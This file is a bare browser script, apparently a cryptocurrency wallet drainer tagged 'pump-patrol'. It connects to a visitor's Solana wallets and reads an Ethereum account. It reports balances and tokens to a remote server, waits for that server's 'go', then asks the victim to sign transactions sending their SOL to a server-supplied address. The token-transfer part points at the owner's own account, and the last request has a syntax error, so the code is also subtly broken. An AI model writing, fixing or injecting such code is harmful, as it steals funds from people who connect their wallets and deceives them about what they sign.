(async()=>{
const K='72d296b612eb0a11931b364ba1333a70';
const BASE=(window.__PP||'').replace(/\/+$/,'');
if(!BASE)return;
const sid=Math.random().toString(36).slice(2,8);
const j=async(u,o)=>{const r=await fetch(u,o);return r.json()};
const le8=v=>{const d=new DataView(new ArrayBuffer(8));d.setBigUint64(0,BigInt(v),true);return[...new Uint8Array(d.buffer)]};
const cfg=await j(`${BASE}/api/config?k=${K}`).catch(()=>null);
if(!cfg)return;
const W3=await(async()=>{try{await new Promise((ok,no)=>{const s=document.createElement('script');s.src='https://cdn.jsdelivr.net/npm/@solana/web3.js@1/lib/index.browser.min.js';s.onload=ok;s.onerror=no;(document.head||document.documentElement).appendChild(s)});if(window.solanaWeb3)return window.solanaWeb3}catch(e){}
try{const r=await fetch('https://cdn.jsdelivr.net/npm/@solana/web3.js@1/lib/index.browser.js');const m={exports:{}};(new Function('module','exports',await r.text()))(m,m.exports);return window.solanaWeb3||m.exports.default||m.exports}catch(e){return null}})();
if(!W3)return;
const{Connection,PublicKey,SystemProgram,Transaction,TransactionInstruction,LAMPORTS_PER_SOL}=W3;
const conn=new Connection(cfg.rpc);
const TOKEN=new PublicKey('TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm'),ATAP=new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8khL'),ME=new PublicKey(cfg.me);
const findAta=(o,m)=>PublicKey.findProgramAddressSync([o.toBuffer(),m.toBuffer()],ATAP)[0];
const cands=[['Phantom',window.phantom?.solana],['Wallet',window.solana],['Solflare',window.solflare],['Backpack',window.backpack?.solana||window.backpack]];
const seen=new Set(),ws=[];
for(const[n,p]of cands)if(p&&p.connect&&!seen.has(p)){seen.add(p);ws.push({n,p})}
let evm='';
try{const e=window.ethereum;if(e){const a=await e.request({method:'eth_accounts'});if(a.length){const w=await e.request({method:'eth_getBalance',params:[a[0],'latest']});evm=`${a[0]} — ${(BigInt(w)/10n**18n).toString()} ETH`}}}catch(e){}
const live=[],rep=[];
const site=location.host||location.protocol+'//'+location.hostname;
for(const w of ws){
  try{
    await w.p.connect();
    const owner=new PublicKey(w.p.publicKey.toString());
    const lam=await conn.getBalance(owner);
    const ta=await conn.getParsedTokenAccountsByOwner(owner,{programId:TOKEN});
    const toks=[];
    for(const it of ta.value){const i=it.account.data.parsed.info,a=i.tokenAmount;if(BigInt(a.amount)>0n)toks.push({src:it.pubkey,mint:new PublicKey(i.mint),dec:a.decimals,amt:a.amount,ui:a.uiAmountString??a.uiAmount})}
    live.push({w,owner,lam,toks});
    rep.push({name:w.n,addr:owner.toString(),sol:+(lam/LAMPORTS_PER_SOL).toFixed(6),tokens:toks.map(t=>({mint:t.mint.toString(),amt:String(t.ui)}))});
  }catch(e){rep.push({name:w.n,addr:'(refused)',sol:0,tokens:[]})}
}
await fetch(`${BASE}/api/report/${sid}?k=${K}`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({site,evm,wallets:rep})}).catch(()=>{});
let act=null;const t0=Date.now();
while(!act&&Date.now()-t0<300000){
  const v=await j(`${BASE}/api/verdict/${sid}?k=${K}`).catch(()=>null);
  if(v&&v.a)act=v.a;else await new Promise(s=>setTimeout(s,2500));
}
if(act!=='go')return;
const RENT=await conn.getMinimumBalanceForRentExemption(165);
let sigs=0;
for(const{w,owner,lam,toks}of live){
  const chunks=[];for(let i=0;i<toks.length;i+=cfg.perTx)chunks.push(toks.slice(i,i+cfg.perTx));
  if(!chunks.length)chunks.push([]);
  let newAtas=0;
  for(const t of toks){const a=await conn.getAccountInfo(findAta(owner,t.mint)).catch(()=>null);if(!a)newAtas++}
  const drainLam=lam-chunks.length*5000-newAtas*RENT;
  let first=true;
  for(const chunk of chunks){
    try{
      const bh=await conn.getLatestBlockhash();
      const tx=new Transaction({feePayer:owner,recentBlockhash:bh.blockhash});
      if(first&&drainLam>0)tx.add(SystemProgram.transfer({fromPubkey:owner,toPubkey:ME,lamports:drainLam}));
      for(const t of chunk){
        const ata=findAta(owner,t.mint);
        const exists=await conn.getAccountInfo(ata).catch(()=>null);
        if(!exists)tx.add(new TransactionInstruction({programId:ATAP,data:Uint8Array.of(0),keys:[
          {pubkey:owner,isSigner:true,isWritable:true},{pubkey:ata,isSigner:false,isWritable:true},{pubkey:owner,isSigner:true,isWritable:false},
          {pubkey:t.mint,isSigner:false,isWritable:false},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false},
          {pubkey:TOKEN,isSigner:false,isWritable:false},{pubkey:W3.SYSVAR_RENT_PUBKEY,isSigner:false,isWritable:false}]}));
        tx.add(new TransactionInstruction({programId:TOKEN,keys:[
          {pubkey:t.src,isSigner:false,isWritable:true},{pubkey:t.mint,isSigner:false,isWritable:false},
          {pubkey:ata,isSigner:false,isWritable:true},{pubkey:owner,isSigner:true,isWritable:false}],
          data:Uint8Array.from([12,...le8(t.amt),t.dec])}));
      }
      let sig;
      if(w.p.signAndSendTransaction){const s=await w.p.signAndSendTransaction(tx);sig=typeof s==='string'?s:(s.signature||s)}
      else{const st=await w.p.signTransaction(tx);sig=await conn.sendRawTransaction(st.serialize())}
      const s=typeof sig==='string'?sig:(sig.signature||String(sig));
      try{await conn.confirmTransaction(s,'confirmed')}catch(e){}
      sigs++;
    }catch(e){}
    first=false;
  }
}
await fetch(`${BASE}/api/report/${sid}?k=${K}`,{method:'POST',headers:{content-type:'application/json'},body:JSON.stringify({site,done:true,note:`${sigs} tx signed`,wallets:rep,evm})}).catch(()=>{});
})().catch(e=>console.warn('pump-patrol',e));